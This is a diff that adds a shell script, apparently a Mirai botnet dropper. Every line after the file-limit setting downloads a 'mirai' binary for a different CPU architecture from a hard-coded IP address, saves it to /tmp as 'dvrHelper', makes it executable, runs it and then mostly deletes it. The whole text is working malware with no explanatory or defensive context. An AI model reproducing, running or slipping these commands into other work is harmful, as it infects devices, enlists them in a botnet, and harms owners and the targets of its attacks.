@@ -1,0 +1,8 @@
+#! /bin/sh
+ulimit -n 712
+cd /tmp;wget http://185.188.206.99/bins/mirai.mips -O - > dvrHelper; chmod 777 dvrHelper;./dvrHelper; rm -rf dvrHelper
+cd /tmp;wget http://185.188.206.99/bins/mirai.x86 -O - > dvrHelper; chmod 777 dvrHelper;./dvrHelper; rm -rf dvrHelper
+cd /tmp;wget http://185.188.206.99/bins/mirai.arm7 -O - > dvrHelper; chmod 777 dvrHelper;./dvrHelper; rm -rf dvrHelper
+cd /tmp;wget http://185.188.206.99/bins/mirai.sh4 -O - > dvrHelper; chmod 777 dvrHelper;./dvrHelper; rm -rf dvrHelper
+cd /tmp;wget http://185.188.206.99/bins/mirai.mpsl -O - > dvrHelper; chmod 777 dvrHelper;./dvrHelper; rm -rf dvrHelper
+cd /tmp;wget http://185.188.206.99/bins/mirai.arm -O - > dvrHelper; chmod 777 dvrHelper;./dvrHelper
